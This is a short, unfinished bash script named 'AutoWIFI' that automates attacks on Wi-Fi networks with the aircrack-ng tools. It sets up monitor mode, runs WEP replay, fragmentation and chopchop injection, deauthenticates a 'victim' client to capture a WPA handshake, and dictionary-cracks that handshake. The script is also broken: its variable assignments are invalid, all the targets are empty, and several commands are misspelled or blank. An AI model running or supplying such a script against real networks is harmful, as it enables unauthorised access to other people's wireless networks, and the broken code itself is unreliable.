echo "AutoWIFI"
apt update > /dev/null 2>&1 && apt upgrade -y > /dev/null 2>&1
echo "updating ..."
echo "WELCOME . . . . "


$AP=""
$VIC=""
$MAC=""
$essid=""
$type=""
$attack=""
$channel=""
$interface="wlan0"



echo "setting up Monitor mode ....."
iwconfig wlan0 mode monitor channel $channel
ifconfig wlan0 up

sudo xterm -geometry "150x50+50+0" -e "airodump-ng wlan0"

echo "testing WEP attacks ....."
sudo xterm -geometry "150x50+50+0" -e "airodump-ng    --bssid $AP  -w clearcap $interface"
wait $!
sudo xterm -geometry "150x50+50+0" -e "aireplay-ng -3 -b $AP -h $MAC wlan0"

echo "testing WEP fragramention ...."
sudo xterm -geometry "150x50+50+0" -e "aireplay-ng -1 60 -e $essid -b $AP -h $MAC $interface"
sudo xterm -geometry "150x50+50+0" -e  "aireplay-ng -5 -b $AP -h $MAC $interface"

#packetforge-ng -0 -a $AP -h $mon -l 192.168.100 -k 192.168.1.255 -y fragment.xor  -w inject.cap
#aireplay -2 -r inject.cap $inteface

echo "Testing CHOCHOP attack ..."
sudo xterm -geometry "150x50+50+0" -e  "aireplay -4 -b $AP  -h $MAC $interface"


echo "Testing WPA attacks ....."

sudo xterm -geometry "150x50+50+0" -e "aireplay-ng -0 1 -a $AP -c $VIC $interface"
sudo xterm -geometry "150x50+50+0" -e "aircrack-ng -0 -w /usr/share/john/password.lst wpa.cap"
sudo xterm -geometry "150x50+50+0" -e ""
sudo xterm -geometry "150x50+50+0" -e ""


echo "Testing WPS attacks ....."

#soon
